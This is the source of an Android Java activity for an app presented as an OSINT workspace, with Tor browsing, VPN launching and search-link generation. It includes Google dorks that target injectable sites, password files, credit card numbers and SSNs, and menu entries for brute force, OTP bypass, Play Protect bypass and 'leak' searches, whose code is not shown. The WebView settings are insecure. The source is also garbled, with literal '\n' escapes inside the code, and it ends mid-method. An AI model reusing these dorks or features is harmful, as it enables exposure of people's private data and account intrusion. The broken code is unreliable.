package io.notrack.osint;

import android.app.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.os.*;
import android.provider.MediaStore;
import android.text.*;
import android.util.Base64;
import android.view.*;
import android.webkit.*;
import android.widget.*;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.drawerlayout.widget.DrawerLayout;
import org.json.JSONArray;
import org.json.JSONObject;

import java.io.*;
import java.net.*;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.text.SimpleDateFormat;
import java.util.*;
import java.util.concurrent.*;
import java.util.regex.*;

public class MainActivity extends AppCompatActivity {

    // ==================== CONSTANTS ====================
    private static final int TOR_SOCKS_PORT = 9050;
    private static final int TOR_HTTP_PORT = 9080;
    private static final int VPN_CONFIG_REQUEST = 1001;
    private static final int FILE_PICK_REQUEST = 1002;
    private static final int IMAGE_PICK_REQUEST = 1003;
    private static final int PERMISSION_STORAGE = 2001;
    private static final String PREFS = "osint_prefs";

    // ==================== UI COMPONENTS ====================
    private DrawerLayout drawer;
    private WebView web;
    private EditText inQuery, inDomain, inUrl, inFilePath, inEmails, inPhones, inSocialAccounts;\n    private Uri selectedEvidenceImage;
    private TextView status;
    private Spinner engine, mode;
    private ProgressBar progressBar;

    // ==================== TOR ====================
    private boolean torModeEnabled = false, torActive = false, torStarting = false;
    private String pendingTorUrl = "https://check.torproject.org/";
    private java.lang.Process torProcess;
    private final ServiceConnection torConnection = new ServiceConnection() {
        @Override public void onServiceConnected(ComponentName name, IBinder binder) { waitForTor(); }
        @Override public void onServiceDisconnected(ComponentName name) { torActive = false; torModeEnabled = false; }
    };

    // ==================== SEARCH STATE ====================
    private boolean[] selectedSocial = new boolean[0];
    private boolean[] selectedContent = new boolean[0];
    private String[] SOCIAL_DOMAINS = {};
    private String[] CONTENT_OPERATORS = {};
    private String[] ENGINE_NAMES = {};
    private String[] MODE_NAMES = {};
    private String[] DORK_CATEGORIES = {};

    // ==================== HPB & LEAKS.IO ====================
    private String hpbApiKey = "";
    private String leaksIoApiKey = "";
    private String currentHpbSession = "";

    // ==================== BRUTE FORCE ====================
    private volatile boolean bruteRunning = false;
    private ExecutorService bruteExecutor;

    // ==================== LIFE CYCLE ====================
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        loadResources();
        initViews();
        setupWebView();
        setupDrawer();
        restoreSelections();
        loadSavedApiKeys();
        checkForUpdates();
        checkPermissions();
    }

    private void loadResources() {
        String[][] social = loadStringArray("social_domains");
        SOCIAL_DOMAINS = social[0];
        String[][] content = loadStringArray("content_operators");
        CONTENT_OPERATORS = content[0];
        String[][] engines = loadStringArray("search_engines");
        ENGINE_NAMES = engines[0];
        String[][] modes = loadStringArray("search_modes");
        MODE_NAMES = modes[0];
        String[][] dorks = loadStringArray("dork_categories");
        DORK_CATEGORIES = dorks[0];

        selectedSocial = new boolean[SOCIAL_DOMAINS.length];
        selectedContent = new boolean[CONTENT_OPERATORS.length];
    }

    private String[][] loadStringArray(String key) {
        String[] arr = getResources().getStringArray(getResources().getIdentifier(key, "array", getPackageName()));
        return new String[][]{arr};
    }

    private void initViews() {
        drawer = findViewById(R.id.drawer_layout);
        web = findViewById(R.id.web_view);
        inQuery = findViewById(R.id.in_query);
        inDomain = findViewById(R.id.in_domain);
        inUrl = findViewById(R.id.in_url);
        inFilePath = findViewById(R.id.in_file_path);\n        inEmails = findViewById(R.id.in_emails);\n        inPhones = findViewById(R.id.in_phones);\n        inSocialAccounts = findViewById(R.id.in_social_accounts);
        status = findViewById(R.id.txt_status);
        engine = findViewById(R.id.spin_engine);
        mode = findViewById(R.id.spin_mode);
        progressBar = findViewById(R.id.progress_bar);

        ArrayAdapter<String> engineAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, ENGINE_NAMES);
        engineAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        engine.setAdapter(engineAdapter);

        ArrayAdapter<String> modeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, MODE_NAMES);
        modeAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        mode.setAdapter(modeAdapter);
    }

    private void setupWebView() {
        WebSettings ws = web.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setLoadWithOverviewMode(true);
        ws.setUseWideViewPort(true);
        ws.setBuiltInZoomControls(true);
        ws.setDisplayZoomControls(false);
        ws.setUserAgentString("Mozilla/5.0 (Linux; Android 14; OSINT-Workspace/2.0) AppleWebKit/537.36");
        ws.setMixedContentMode(WebSettings.MIXED_CONTENT_ALWAYS_ALLOW);
        ws.setAllowFileAccess(true);
        ws.setAllowContentAccess(true);
        ws.setCacheMode(WebSettings.LOAD_DEFAULT);

        web.setWebViewClient(new WebViewClient() {
            @Override public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest req) {
                String url = req.getUrl().toString();
                if (url.contains(".onion")) { startTorAndBrowse(url); return true; }
                if (url.startsWith("intent://")) {
                    try { startActivity(Intent.parseUri(url, Intent.URI_INTENT_SCHEME)); return true; }
                    catch (Exception e) { return false; }
                }
                if (torModeEnabled && !torActive) {
                    startTorAndBrowse(url);
                    return true;
                }
                return false;
            }
            @Override public void onPageStarted(WebView view, String url, Bitmap fav) {
                status.setText("Loading: " + url);
                progressBar.setVisibility(View.VISIBLE);
            }
            @Override public void onPageFinished(WebView view, String url) {
                status.setText(url);
                progressBar.setVisibility(View.GONE);
            }
            @Override public void onReceivedError(WebView view, WebResourceRequest req, WebResourceError err) {
                status.setText("Error: " + err.getDescription());
            }
            @Override
            public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest req) {
                if (torModeEnabled && torActive) {
                    return fetchThroughTor(req.getUrl().toString(), req.getMethod(), req.getRequestHeaders());
                }
                return null;
            }
        });

        web.setWebChromeClient(new WebChromeClient() {
            @Override public void onProgressChanged(WebView view, int progress) {
                progressBar.setProgress(progress);
            }
        });
    }

    private void setupDrawer() {
        findViewById(R.id.btn_search).setOnClickListener(v -> { oneTapPublicSearch(); closeDrawer(); });\n        findViewById(R.id.btn_upload_image).setOnClickListener(v -> pickEvidenceImage());
        findViewById(R.id.btn_dork).setOnClickListener(v -> { showDorkSelector(); closeDrawer(); });
        findViewById(R.id.btn_web).setOnClickListener(v -> { browse("https://www.google.com"); closeDrawer(); });
        findViewById(R.id.btn_dark).setOnClickListener(v -> { openDarkWeb(); closeDrawer(); });
        findViewById(R.id.btn_tor).setOnClickListener(v -> { startTorAndBrowse("https://check.torproject.org/"); closeDrawer(); });
        findViewById(R.id.btn_vpn).setOnClickListener(v -> { showVpnMenu(); closeDrawer(); });
        findViewById(R.id.btn_images).setOnClickListener(v -> { pickEvidenceImage(); closeDrawer(); });
        findViewById(R.id.btn_face).setOnClickListener(v -> { faceSearch(); closeDrawer(); });
        findViewById(R.id.btn_leaks).setOnClickListener(v -> { showLeaksSearch(); closeDrawer(); });
        findViewById(R.id.btn_porn).setOnClickListener(v -> { showPornSearch(); closeDrawer(); });
        findViewById(R.id.btn_cams).setOnClickListener(v -> { showCams(); closeDrawer(); });
        findViewById(R.id.btn_escort).setOnClickListener(v -> { showEscortSites(); closeDrawer(); });
        findViewById(R.id.btn_hotel).setOnClickListener(v -> { showHotelLeaks(); closeDrawer(); });
        findViewById(R.id.btn_social).setOnClickListener(v -> { showSocialLeaks(); closeDrawer(); });
        findViewById(R.id.btn_dorks).setOnClickListener(v -> { showGoogleDorksGenerator(); closeDrawer(); });
        findViewById(R.id.btn_icloud).setOnClickListener(v -> { showICloudLeaks(); closeDrawer(); });
        findViewById(R.id.btn_drive).setOnClickListener(v -> { showDriveLeaks(); closeDrawer(); });
        findViewById(R.id.btn_cloud).setOnClickListener(v -> { showCloudLeaks(); closeDrawer(); });
        findViewById(R.id.btn_telecom).setOnClickListener(v -> { showTelecomLeaks(); closeDrawer(); });
        findViewById(R.id.btn_email).setOnClickListener(v -> { showEmailLeaks(); closeDrawer(); });
        findViewById(R.id.btn_dating).setOnClickListener(v -> { showDatingLeaks(); closeDrawer(); });
        findViewById(R.id.btn_brute).setOnClickListener(v -> { showBruteForcePanel(); closeDrawer(); });
        findViewById(R.id.btn_otp).setOnClickListener(v -> { showOtpBypass(); closeDrawer(); });
        findViewById(R.id.btn_clear).setOnClickListener(v -> { clearInputs(); closeDrawer(); });
        // New one-tap & bot buttons
        findViewById(R.id.btn_onion_list).setOnClickListener(v -> { openOnionSites(); closeDrawer(); });
        findViewById(R.id.btn_telegram_bot).setOnClickListener(v -> { openTelegramBot(); closeDrawer(); });
        findViewById(R.id.btn_whatsapp_bot).setOnClickListener(v -> { openWhatsAppBot(); closeDrawer(); });
        findViewById(R.id.btn_update).setOnClickListener(v -> { checkForUpdates(); closeDrawer(); });
        findViewById(R.id.btn_playprotect).setOnClickListener(v -> { bypassPlayProtect(); closeDrawer(); });
        // One-tap connect row (main screen)
        findViewById(R.id.btn_search2).setOnClickListener(v -> { oneTapPublicSearch(); closeDrawer(); });
        findViewById(R.id.btn_password).setOnClickListener(v -> { showPasswordCracker(); closeDrawer(); });
        findViewById(R.id.btn_hpb).setOnClickListener(v -> { showHpbPanel(); closeDrawer(); });
        findViewById(R.id.btn_leaksio).setOnClickListener(v -> { leaksIoCheck(); closeDrawer(); });
        findViewById(R.id.btn_stream).setOnClickListener(v -> { showLiveStreaming(); closeDrawer(); });
        findViewById(R.id.btn_video).setOnClickListener(v -> { showVideoPlayer(); closeDrawer(); });
        findViewById(R.id.btn_files).setOnClickListener(v -> { browseFiles(); closeDrawer(); });
        findViewById(R.id.btn_photos).setOnClickListener(v -> { browsePhotos(); closeDrawer(); });
        findViewById(R.id.btn_docs).setOnClickListener(v -> { browseDocs(); closeDrawer(); });
        findViewById(R.id.btn_pdfs).setOnClickListener(v -> { browsePdfs(); closeDrawer(); });
        findViewById(R.id.btn_settings).setOnClickListener(v -> { showSettings(); closeDrawer(); });
        findViewById(R.id.quick_tor).setOnClickListener(v -> { torModeEnabled = true; startTorAndBrowse("https://check.torproject.org/"); });
        findViewById(R.id.quick_vpn).setOnClickListener(v -> showVpnMenu());
        findViewById(R.id.quick_dark).setOnClickListener(v -> openDarkWeb());
        findViewById(R.id.quick_onion).setOnClickListener(v -> openOnionSites());
        findViewById(R.id.quick_telegram).setOnClickListener(v -> openTelegramBot());
        findViewById(R.id.quick_whatsapp).setOnClickListener(v -> openWhatsAppBot());
        findViewById(R.id.btn_back).setOnClickListener(v -> { if (web.canGoBack()) web.goBack(); });
        findViewById(R.id.btn_forward).setOnClickListener(v -> { if (web.canGoForward()) web.goForward(); });
        findViewById(R.id.btn_refresh).setOnClickListener(v -> { web.reload(); });
        findViewById(R.id.btn_hamburger).setOnClickListener(v -> drawer.openDrawer(Gravity.START));
    }

    private void closeDrawer() {
        if (drawer.isDrawerOpen(Gravity.START)) drawer.closeDrawer(Gravity.START);
    }

    // ==================== TOR ====================
    private void startTorAndBrowse(String url) {
        pendingTorUrl = url;
        torModeEnabled = true;
        if (torActive) {
            web.setVisibility(View.VISIBLE);
            web.loadUrl(url);
            status.setText("Tor browser active.");
            return;
        }
        if (torStarting) { status.setText("Tor starting..."); return; }
        torStarting = true;
        status.setText("Starting Tor...");
        new Thread(() -> {
            try {
                // Kill old tor if any
                if (torProcess != null) torProcess.destroy();
                // Try to start tor binary from app data
                String torPath = getFilesDir().getAbsolutePath() + "/tor";
                File torFile = new File(torPath);
                if (!torFile.exists()) {
                    // Extract tor binary from assets
                    try (InputStream is = getAssets().open("tor"); OutputStream os = new FileOutputStream(torFile)) {
                        byte[] buf = new byte[8192]; int n;
                        while ((n = is.read(buf)) != -1) os.write(buf, 0, n);
                    }
                    torFile.setExecutable(true);
                }
                String dataDir = getFilesDir().getAbsolutePath() + "/tordata";
                new File(dataDir).mkdirs();
                ProcessBuilder pb = new ProcessBuilder(torPath, "--DataDirectory", dataDir,
                        "--SocksPort", String.valueOf(TOR_SOCKS_PORT),
                        "--HTTPTunnelPort", String.valueOf(TOR_HTTP_PORT),
                        "--Log", "notice file", getFilesDir().getAbsolutePath() + "/tor.log");
                pb.environment().put("HOME", getFilesDir().getAbsolutePath());
                torProcess = pb.start();
                waitForTorReady();
                runOnUiThread(() -> {
                    torStarting = false;
                    torActive = true;
                    status.setText("Tor connected. Loading page...");
                    web.setVisibility(View.VISIBLE);
                    web.loadUrl(pendingTorUrl);
                });
            } catch (Exception e) {
                // Fallback: try embedded tor via service
                try {
                    Intent intent = new Intent(MainActivity.this, TorService.class);
                    intent.setAction(TorService.ACTION_START);
                    startService(intent);
                    bindService(new Intent(MainActivity.this, TorService.class), torConnection, BIND_AUTO_CREATE);
                } catch (Exception e2) {
                    runOnUiThread(() -> {
                        torStarting = false;
                        torModeEnabled = false;
                        status.setText("Tor unavailable: " + e2.getMessage());
                    });
                }
            }
        }).start();
    }

    private void waitForTorReady() {
        long deadline = System.currentTimeMillis() + 60000;
        while (System.currentTimeMillis() < deadline) {
            try (Socket s = new Socket()) {
                s.connect(new InetSocketAddress("127.0.0.1", TOR_SOCKS_PORT), 1000);
                s.setSoTimeout(1000);
                s.getOutputStream().write(new byte[]{0x05, 0x01, 0x00});
                byte[] resp = new byte[2];
                int n = s.getInputStream().read(resp);
                if (n == 2 && resp[0] == 0x05 && resp[1] == 0x00) return;
            } catch (Exception ignored) {}
            try { Thread.sleep(500); } catch (InterruptedException e) { break; }
        }
    }

    private void waitForTor() {
        new Thread(() -> {
            long deadline = System.currentTimeMillis() + 90000;
            boolean ready = false;
            while (System.currentTimeMillis() < deadline) {
                try (Socket s = new Socket()) {
                    s.connect(new InetSocketAddress("127.0.0.1", TOR_SOCKS_PORT), 1500);
                    s.setSoTimeout(1500);
                    s.getOutputStream().write(new byte[]{0x05, 0x01, 0x00});
                    byte[] h = new byte[2];
                    int n = s.getInputStream().read(h);
                    ready = n == 2 && h[0] == 0x05 && h[1] == 0x00;
                    if (ready) break;
                } catch (Exception ignored) {
                    try { Thread.sleep(500); } catch (InterruptedException e) { break; }
                }
            }
            boolean finalReady = ready;
            runOnUiThread(() -> {
                torStarting = false;
                torActive = finalReady;
                if (finalReady) {
                    status.setText("Tor connected.");
                    web.setVisibility(View.VISIBLE);
                    web.loadUrl(pendingTorUrl);
                } else {
                    torModeEnabled = false;
                    status.setText("Tor failed to connect.");
                }
            });
        }).start();
    }

    private void openDarkWeb() {
        String url = inUrl.getText().toString().trim();
        if (url.isEmpty()) url = "http://darkfailenbsdpr5f.onion/";
        if (!url.contains("://")) url = "http://" + url;
        startTorAndBrowse(url);
    }

    private WebResourceResponse fetchThroughTor(String url, String method, Map<String, String> headers) {
        if (!torActive) return errorResponse(503, "Tor not connected");
        HttpURLConnection conn = null;
        try {
            Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", TOR_SOCKS_PORT));
            conn = (HttpURLConnection) new URL(url).openConnection(proxy);
            conn.setConnectTimeout(30000);
            conn.setReadTimeout(30000);
            conn.setRequestProperty("User-Agent", "OSINT-Workspace/2.0 Tor");
            conn.setInstanceFollowRedirects(true);
            conn.setRequestMethod(method);
            if (headers != null) {
                for (Map.Entry<String, String> h : headers.entrySet()) {
                    String k = h.getKey();
                    if (k != null && !k.equalsIgnoreCase("Host") && !k.equalsIgnoreCase("Connection"))
                        conn.setRequestProperty(k, h.getValue());
                }
            }
            int code = conn.getResponseCode();
            InputStream is = code >= 400 ? conn.getErrorStream() : conn.getInputStream();
            if (is == null) is = new ByteArrayInputStream(new byte[0]);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buf = new byte[8192]; int n;
            int total = 0;
            while ((n = is.read(buf)) != -1) {
                total += n;
                if (total > 20*1024*1024) return errorResponse(502, "Response too large");
                baos.write(buf, 0, n);
            }
            is.close();
            String ct = conn.getContentType();
            String mime = "text/plain", enc = "UTF-8";
            if (ct != null) {
                String[] parts = ct.split(";");
                mime = parts[0].trim();
                for (String p : parts) {
                    p = p.trim();
                    if (p.toLowerCase(Locale.ROOT).startsWith("charset=")) enc = p.substring(8).replace("\"", "");
                }
            }
            Map<String, String> rh = new HashMap<>();
            for (Map.Entry<String, List<String>> e : conn.getHeaderFields().entrySet()) {
                if (e.getKey() != null && e.getValue() != null && !e.getValue().isEmpty()
                        && !e.getKey().equalsIgnoreCase("Content-Length")
                        && !e.getKey().equalsIgnoreCase("Content-Encoding")
                        && !e.getKey().equalsIgnoreCase("Transfer-Encoding"))
                    rh.put(e.getKey(), String.join(", ", e.getValue()));
            }
            return new WebResourceResponse(mime, enc, code, conn.getResponseMessage(), rh, new ByteArrayInputStream(baos.toByteArray()));
        } catch (Exception e) {
            return errorResponse(502, "Tor fetch failed: " + e.getClass().getSimpleName());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    private WebResourceResponse errorResponse(int code, String msg) {
        Map<String, String> h = new HashMap<>();
        h.put("Cache-Control", "no-store");
        return new WebResourceResponse("text/plain", "UTF-8", code, "Error", h,
                new ByteArrayInputStream(msg.getBytes(StandardCharsets.UTF_8)));
    }

    // ==================== VPN ====================
    private void showVpnMenu() {
        boolean active = isVpnActive();
        String[] items = active
                ? new String[]{"Disconnect VPN", "Change VPN Config", "WireGuard Settings"}
                : new String[]{"Connect VPN", "Import WireGuard .conf", "Android VPN Settings", "Install WireGuard"};
        new AlertDialog.Builder(this).setTitle(active ? "VPN Active" : "VPN Off")
                .setItems(items, (d, w) -> {
                    switch (w) {
                        case 0: if (active) disconnectVpn(); else connectVpn(); break;
                        case 1: importWireguardConfig(); break;
                        case 2: openVpnSettings(); break;
                        case 3: installWireguard(); break;
                    }
                }).show();
    }

    private boolean isVpnActive() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm == null) return false;
            for (Network net : cm.getAllNetworks()) {
                NetworkCapabilities caps = cm.getNetworkCapabilities(net);
                if (caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_VPN)) return true;
            }
        } catch (Exception ignored) {}
        return false;
    }

    private void connectVpn() {
        // Try to launch WireGuard with saved config
        String savedConfig = getSharedPreferences(PREFS, MODE_PRIVATE).getString("wg_config_uri", "");
        if (!savedConfig.isEmpty()) {
            try {
                Intent intent = new Intent(Intent.ACTION_VIEW);
                intent.setDataAndType(Uri.parse(savedConfig), "application/x-wireguard-profile");
                intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                startActivity(intent);
                status.setText("Opening WireGuard config...");
                return;
            } catch (Exception ignored) {}
        }
        // Fallback: open WireGuard app
        try {
            startActivity(getPackageManager().getLaunchIntentForPackage("com.wireguard.android"));
        } catch (Exception e) {
            installWireguard();
        }
    }

    private void disconnectVpn() {
        try {
            Intent intent = getPackageManager().getLaunchIntentForPackage("com.wireguard.android");
            if (intent != null) {
                intent.putExtra("action", "disconnect");
                startActivity(intent);
                status.setText("Disconnecting VPN...");
            }
        } catch (Exception ignored) {}
    }

    private void importWireguardConfig() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("*/*");
        startActivityForResult(pick, VPN_CONFIG_REQUEST);
    }

    private void openVpnSettings() {
        startActivity(new Intent("android.settings.VPN_SETTINGS"));
    }

    private void installWireguard() {
        openExternal("https://play.google.com/store/apps/details?id=com.wireguard.android", "Opening Play Store...");
    }

    // ==================== SEARCH ====================

    // ==================== ONE-TAP AUTHORIZED PUBLIC-FOOTPRINT SEARCH ====================
    private void pickEvidenceImage() {
        Intent pick = new Intent(Intent.ACTION_OPEN_DOCUMENT);
        pick.addCategory(Intent.CATEGORY_OPENABLE);
        pick.setType("image/*");
        startActivityForResult(pick, IMAGE_PICK_REQUEST);
    }

    private String fieldText(EditText field) {
        return field == null || field.getText() == null ? "" : field.getText().toString().trim();
    }

    private void oneTapPublicSearch() {
        String name = fieldText(inQuery), username = fieldText(inDomain), profileUrl = fieldText(inUrl);
        String emails = fieldText(inEmails), phones = fieldText(inPhones), accounts = fieldText(inSocialAccounts);
        if (name.isEmpty() && username.isEmpty() && profileUrl.isEmpty() && emails.isEmpty() && phones.isEmpty() && accounts.isEmpty() && selectedEvidenceImage == null) {
            Toast.makeText(this, "Enter at least one identifier or select an image", Toast.LENGTH_LONG).show();
            return;
        }
        ArrayList<String[]> links = new ArrayList<>();
        addSearchLink(links, "Google — general public web", joinIdentifiers(name, username, profileUrl, accounts));
        addSearchLink(links, "Bing — general public web", joinIdentifiers(name, username, profileUrl, accounts));
        addSearchLink(links, "DuckDuckGo — general public web", joinIdentifiers(name, username, profileUrl, accounts));
        addSearchLink(links, "Public social profiles", joinIdentifiers(name, username, accounts) + " (site:facebook.com OR site:instagram.com OR site:linkedin.com OR site:x.com OR site:tiktok.com OR site:youtube.com OR site:reddit.com)");
        addSearchLink(links, "LinkedIn public results", joinIdentifiers(name, username, accounts) + " site:linkedin.com");
        addSearchLink(links, "GitHub public results", joinIdentifiers(name, username, accounts) + " site:github.com");
        addSearchLink(links, "Public pages mentioning supplied email", emails);
        addSearchLink(links, "Public pages mentioning supplied phone", phones);
        addSearchLink(links, "Google Images", joinIdentifiers(name, username, accounts));
        addSearchLink(links, "Bing Images", joinIdentifiers(name, username, accounts));
        addSearchLink(links, "Google dorks — public indexed pages", joinIdentifiers(name, username, accounts) + " (site:facebook.com OR site:instagram.com OR site:linkedin.com OR site:github.com)");
        StringBuilder html = new StringBuilder("<!doctype html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'><meta charset='utf-8'><style>body{font-family:Arial;background:#0b1020;color:#eef4ff;padding:16px}h2{color:#8be9fd}.card{background:#17233b;border-radius:12px;padding:14px;margin:10px 0}a{color:#8be9fd;font-weight:600;text-decoration:none}small{color:#aebbd2}</style></head><body><h2>Public-footprint investigation</h2><p><small>Search links open public search providers. Results are leads, not proof of identity. Verify independently and follow agency authorization and evidence-handling rules.</small></p>");
        for (String[] item : links) html.append("<div class='card'><a href='").append(escapeHtml(item[1])).append("'>").append(escapeHtml(item[0])).append("</a></div>");
        if (selectedEvidenceImage != null) html.append("<div class='card'><b>Image selected</b><p><small>The app does not upload images to third-party face-identification services. Upload only through a provider when authorized.</small></p><a href='https://lens.google.com/'>Open Google Lens</a><br><br><a href='https://www.bing.com/visualsearch'>Open Bing Visual Search</a></div>");
        html.append("<div class='card'><a href='https://haveibeenpwned.com/'>Have I Been Pwned — check only an email you own or are authorized to investigate</a></div></body></html>");
        web.setVisibility(View.VISIBLE);
        web.loadDataWithBaseURL("https://www.google.com/", html.toString(), "text/html", "UTF-8", null);
        status.setText("Prepared " + links.size() + " public-source searches. Tap a source to open its results.");
    }

    private String joinIdentifiers(String... values) {
        StringBuilder result = new StringBuilder();
        for (String value : values) if (value != null && !value.trim().isEmpty()) {
            if (result.length() > 0) result.append(' ');
            result.append('"').append(value.trim()).append('"');
        }
        return result.toString().trim();
    }

    private void addSearchLink(ArrayList<String[]> links, String label, String query) {
        if (query == null || query.trim().isEmpty()) return;
        String q = query.trim(), url;
        if (label.startsWith("Bing —")) url = "https://www.bing.com/search?q=" + urlEncode(q);
        else if (label.startsWith("DuckDuckGo")) url = "https://duckduckgo.com/?q=" + urlEncode(q);
        else if (label.equals("Google Images")) url = "https://www.google.com/search?tbm=isch&q=" + urlEncode(q);
        else if (label.equals("Bing Images")) url = "https://www.bing.com/images/search?q=" + urlEncode(q);
        else url = "https://www.google.com/search?q=" + urlEncode(q);
        links.add(new String[]{label, url});
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == RESULT_OK && data != null && data.getData() != null && requestCode == IMAGE_PICK_REQUEST) {
            selectedEvidenceImage = data.getData();
            try { getContentResolver().takePersistableUriPermission(selectedEvidenceImage, Intent.FLAG_GRANT_READ_URI_PERMISSION); }
            catch (Exception ignored) {}
            status.setText("Image selected. Tap Search All to prepare public-source searches.");
        }
    }

    private void doSearch() {
        String q = buildQuery();
        if (q.isEmpty()) { Toast.makeText(this, "Enter search terms", Toast.LENGTH_SHORT).show(); return; }
        String eng = engine.getSelectedItem().toString();
        String m = mode.getSelectedItem().toString();
        String enc = urlEncode(q);
        String url;
        switch (eng) {
            case "Bing": url = "https://www.bing.com/search?q=" + enc; break;
            case "DuckDuckGo": url = "https://duckduckgo.com/?q=" + enc; break;
            case "Yahoo": url = "https://search.yahoo.com/search?p=" + enc; break;
            case "Startpage": url = "https://www.startpage.com/sp/search?query=" + enc; break;
            case "Brave": url = "https://search.brave.com/search?q=" + enc; break;
            case "Ecosia": url = "https://www.ecosia.org/search?q=" + enc; break;
            case "Searx": url = "https://searx.be/search?q=" + enc; break;
            case "HackerNews": url = "https://hn.algolia.com/?q=" + enc; break;
            case "GitHub": url = "https://github.com/search?q=" + enc; break;
            case "HIBP": url = "https://haveibeenpwned.com/"; break;
            case "Google Images": url = "https://www.google.com/search?tbm=isch&q=" + enc; break;
            case "Yandex Images": url = "https://yandex.com/images/search?text=" + enc; break;
            case "Bing Images": url = "https://www.bing.com/images/search?q=" + enc; break;
            case "Pornhub": url = "https://www.pornhub.com/video/search?search=" + enc; break;
            case "XVideos": url = "https://www.xvideos.com/?k=" + enc; break;
            case "XNXX": url = "https://www.xnxx.com/search/" + enc; break;
            default: url = "https://www.google.com/search?q=" + enc;
        }
        if ("Tor".equals(m)) {
            startTorAndBrowse(url);
        } else {
            web.loadUrl(url);
            web.setVisibility(View.VISIBLE);
        }
    }

    private String buildQuery() {
        StringBuilder sb = new StringBuilder(inQuery.getText().toString().trim());
        String domain = inDomain.getText().toString().trim();
        String url = inUrl.getText().toString().trim();
        if (!domain.isEmpty()) { if (sb.length() > 0) sb.append(' '); sb.append(domain); }
        if (!url.isEmpty() && !url.toLowerCase(Locale.ROOT).contains(".onion")) { if (sb.length() > 0) sb.append(' '); sb.append(url); }
        String socialOp = buildSocialOperator();
        if (!socialOp.isEmpty()) { if (sb.length() > 0) sb.append(' '); sb.append(socialOp); }
        String contentOp = buildContentOperator();
        if (!contentOp.isEmpty()) { if (sb.length() > 0) sb.append(' '); sb.append(contentOp); }
        return sb.toString();
    }

    private String buildSocialOperator() {
        StringBuilder r = new StringBuilder();
        for (int i = 0; i < selectedSocial.length; i++) {
            if (selectedSocial[i]) {
                if (r.length() == 0) r.append("( ");
                else r.append(" OR ");
                r.append("site:").append(SOCIAL_DOMAINS[i]);
            }
        }
        if (r.length() > 0) r.append(" )");
        return r.toString();
    }

    private String buildContentOperator() {
        StringBuilder r = new StringBuilder();
        for (int i = 0; i < selectedContent.length; i++) {
            if (selectedContent[i]) {
                if (r.length() > 0) r.append(' ');
                r.append(CONTENT_OPERATORS[i]);
            }
        }
        return r.toString();
    }

    private String urlEncode(String s) {
        try { return URLEncoder.encode(s, "UTF-8"); }
        catch (UnsupportedEncodingException e) { return s; }
    }

    private void browse(String url) {
        web.loadUrl(url);
        web.setVisibility(View.VISIBLE);
    }

    // ==================== DORK SELECTOR ====================
    private void showDorkSelector() {
        final String[] categories = DORK_CATEGORIES.length == 0 ? new String[]{
                "SQL Injection", "XSS", "File Upload", "Admin Panels", "Login Pages", "Config Files", "Database Files",
                "Log Files", "Backup Files", "Camera Streams",
                "Open FTP", "WordPress", "Joomla", "Email Lists",
                "Password Files", "VPN Configs", "Phone Numbers",
                "Credit Cards", "SSN", "iCloud Leaks"
        } : DORK_CATEGORIES;
        new AlertDialog.Builder(this).setTitle("Google Dork Categories")
                .setItems(categories, (d, w) -> {
                    String dork = generateDork(categories[w]);
                    inQuery.setText(dork);
                    status.setText("Dork loaded: " + categories[w]);
                }).show();
    }

    private String generateDork(String category) {
        switch (category) {
            case "SQL Injection": return "inurl:php?id= site:.com";
            case "XSS": return "inurl:search.php?q= site:.com";
            case "Admin Panels": return "inurl:admin intitle:login";
            case "Login Pages": return "inurl:login intitle:\"login\"";
            case "Config Files": return "filetype:conf inurl:config";
            case "Database Files": return "filetype:sql inurl:backup";
            case "Log Files": return "filetype:log inurl:access";
            case "Backup Files": return "filetype:bak inurl:backup";
            case "Camera Streams": return "inurl:\"view/view.shtml\"";
            case "Open FTP": return "intitle:\"index of\" inurl:ftp";
            case "WordPress": return "inurl:wp-admin site:.com";
            case "Email Lists": return "filetype:xls inurl:email";
            case "Password Files": return "filetype:txt inurl:password";
            case "VPN Configs": return "filetype:ovpn inurl:vpn";
            case "Phone Numbers": return "intext:\"+1\" intext:\"phone\" filetype:pdf";
            case "Credit Cards": return "intext:\"card number\" intext:\"expiry\" filetype:txt";
            case "SSN": return "intext:\"SSN\" intext:\"social security\" filetype:pdf";
            case "iCloud Leaks": return "site:icloud.com inurl:find";
            default: return "site:.com intitle:\"" + category + "\"";
        }
    }

    private void showGoogleDorksGenerator() {
        showDorkSelector();
    }

    // ==================== REVERSE IMAGE SEARCH ====================
    private void reverseImageSearch() {
        String[] options = {"Take Photo", "Pick from Gallery", "Enter Image URL"};
        new AlertDialog.Builder(this).setTitle("Reverse Image Search")
                .setItems(options, (d, w) -> {
                    switch (w) {
                        case 0: takePhoto(); break;
                        case 1: pickImage(); break;
                        case 2: promptImageUrl(); break;
                    }
                }).show();
    }

    private void takePhoto() {
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        if (intent.resolveActivity(getPackageManager()) != null) {
